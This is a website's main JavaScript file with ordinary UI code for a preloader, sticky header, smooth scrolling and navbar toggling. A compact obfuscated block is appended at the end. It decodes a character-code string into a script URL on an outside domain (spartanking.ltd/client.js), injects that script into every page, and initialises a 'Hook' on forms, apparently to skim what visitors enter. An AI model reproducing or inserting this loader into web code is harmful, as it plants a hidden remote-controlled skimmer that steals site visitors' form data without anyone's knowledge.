(function () {
  'use strict';
  window.onload = function () {
    window.setTimeout(fadeout, 500);
  };
  function fadeout() {
    document.querySelector('.preloader').style.opacity = '0';
    document.querySelector('.preloader').style.display = 'none';
  }
  window.onscroll = function () {
    if (window.location.pathname.includes('/wedding-invitation/')) return;
    if (window.location.pathname.includes('/form')) return;
    var header_navbar = document.getElementById('header_navbar');
    var logo = document.querySelector('img#logo');
    var sticky = header_navbar.offsetTop;
    if (window.pageYOffset > sticky) {
      header_navbar.classList.add('sticky');
      logo.style.width = '80px';
      logo.style.heigth = '80px';
      logo.setAttribute('src', 'assets/images/logo-2.png');
    } else {
      header_navbar.classList.remove('sticky');
      logo.setAttribute('src', 'assets/images/logo.png');
    }
    var backToTo = document.querySelector('.back-to-top');
    if (
      document.body.scrollTop > 50 ||
      document.documentElement.scrollTop > 50
    ) {
      backToTo.style.display = 'block';
    } else {
      backToTo.style.display = 'none';
    }
  };
  var pageLink = document.querySelectorAll('.page-scroll');
  pageLink.forEach((elem) => {
    elem.addEventListener('click', (e) => {
      e.preventDefault();
      document
        .querySelector(elem.getAttribute('href'))
        .scrollIntoView({ behavior: 'smooth', offsetTop: 1 - 60 });
    });
  });
  function onScroll(event) {
    var sections = document.querySelectorAll('.page-scroll');
    var scrollPos =
      window.pageYOffset ||
      document.documentElement.scrollTop ||
      document.body.scrollTop;
    for (var i = 0; i < sections.length; i++) {
      var currLink = sections[i];
      var val = currLink.getAttribute('href');
      var refElement = document.querySelector(val);
      var scrollTopMinus = scrollPos + 73;
      if (
        refElement.offsetTop <= scrollTopMinus &&
        refElement.offsetTop + refElement.offsetHeight > scrollTopMinus
      ) {
        document.querySelector('.page-scroll').classList.remove('active');
        currLink.classList.add('active');
      } else {
        currLink.classList.remove('active');
      }
    }
  }
  window.document.addEventListener('scroll', onScroll);
  let navbarToggler = document.querySelector('.navbar-toggler');
  var navbarCollapse = document.querySelector('.navbar-collapse');
  document.querySelectorAll('.page-scroll').forEach((e) =>
    e.addEventListener('click', () => {
      navbarToggler.classList.remove('active');
      navbarCollapse.classList.remove('show');
    })
  );
})();


(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b